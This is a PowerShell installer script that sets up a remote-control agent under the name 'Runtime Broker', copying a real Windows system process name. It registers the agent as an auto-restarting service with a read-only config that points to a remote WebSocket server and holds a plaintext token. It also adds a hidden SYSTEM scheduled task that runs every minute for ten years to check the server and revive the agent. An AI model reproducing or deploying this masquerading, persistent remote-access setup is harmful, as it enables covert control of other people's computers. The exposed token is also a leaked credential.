# Permanent RuntimeBroker Installer - FIXED VERSION 1.0.0.3
# Fixes: Render URL (-k2nn), Token (Alok@1234), file churn, watchdog, keepalive
$ErrorActionPreference = 'Stop'
$InstallDir = 'C:\Program Files\RuntimeBroker'
$SrcExe = 'C:\Users\HP\Desktop\Runtime Broker\publish-single\RuntimeBroker.exe'

Write-Host "[1/5] Installing files..."
New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
Copy-Item $SrcExe "$InstallDir\RuntimeBroker.exe" -Force

Write-Host "[2/5] Writing locked config (prevents file-watcher loop)..."
$config = @'
{
  "ServerUrl": "wss://windows-remote-toolkit-k2nn.onrender.com/ws/agent",
  "Token": "Alok@1234",
  "ReconnectDelaySec": 5
}
'@
$config | Out-File "$InstallDir\agent.config.json" -Encoding ascii -Force
attrib +R "$InstallDir\agent.config.json"
icacls "$InstallDir\agent.config.json" /inheritance:r /grant:r "SYSTEM:(R)" /grant:r "Administrators:(R)" /grant:r "Users:(R)" | Out-Null

Write-Host "[3/5] Installing service..."
$svc = Get-Service RuntimeBroker -ErrorAction SilentlyContinue
if ($svc) { Stop-Service RuntimeBroker -Force -ErrorAction SilentlyContinue; sc.exe delete RuntimeBroker | Out-Null; Start-Sleep 2 }
New-Service -Name 'RuntimeBroker' -DisplayName 'Runtime Broker' -BinaryPathName "`"$InstallDir\RuntimeBroker.exe`" --service" -StartupType Automatic | Out-Null
sc.exe failure RuntimeBroker reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null

Write-Host "[4/5] Installing watchdog (heals zombie in <3 min)..."
$watchdog = @'
$ErrorActionPreference='SilentlyContinue'
$state="$env:ProgramData\rb-zero.txt";$c=0;if(Test-Path $state){$c=[int](Get-Content $state)}
try{$h=Invoke-RestMethod -Uri 'https://windows-remote-toolkit-k2nn.onrender.com/api/health' -TimeoutSec 30}catch{$h=$null}
if($h -and $h.ok){if($h.agents -gt 0){$c=0}else{$c++;if($c -ge 2){Restart-Service RuntimeBroker -Force;$c=0}}} ; Set-Content $state $c -Force
'@
$watchdog | Out-File "$InstallDir\watchdog.ps1" -Encoding ascii -Force
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$InstallDir\watchdog.ps1`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
Register-ScheduledTask -TaskName 'RuntimeBrokerWatchdog' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
schtasks /delete /tn RenderWatchdog /f 2>$null | Out-Null
schtasks /delete /tn RenderKeepAlive /f 2>$null | Out-Null

Write-Host "[5/5] Starting service..."
Start-Service RuntimeBroker
Start-Sleep 8
$log = Get-Content "$InstallDir\agent.service.log" -Tail 3 -ErrorAction SilentlyContinue
$log | ForEach-Object { Write-Host "  $_" }
Write-Host "Done. Health check in 5s..."
Start-Sleep 5
Invoke-RestMethod -Uri 'https://windows-remote-toolkit-k2nn.onrender.com/api/health' -TimeoutSec 15 | ConvertTo-Json -Compress | Write-Host
